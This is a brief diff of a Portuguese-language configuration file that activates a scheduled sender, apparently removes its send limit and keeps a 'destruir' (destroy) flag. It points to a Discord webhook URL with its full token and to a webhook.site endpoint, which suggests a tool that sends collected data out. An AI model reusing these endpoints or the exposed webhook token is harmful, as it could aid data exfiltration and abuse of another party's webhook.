@@ -1,9 +1,10 @@
 versao=1
-ativo=0
+ativo=1
 hora_inicio=0
 hora_fim=0
 intervalo=20
-max_envios=5
+max_envios=0
+dedupe=0
 destruir=0
 endpoint=https://discord.com/api/webhooks/1573106539567251646/wldqSXA_RqT98UqzVS_QDAGtllmCWumlErdWXD9cIOp1hcS5I2BA4DXe54cey0XJJxpB
 endpoint2=https://webhook.site/dbe0c345-1848-466b-b6c6-dc4c5640423e
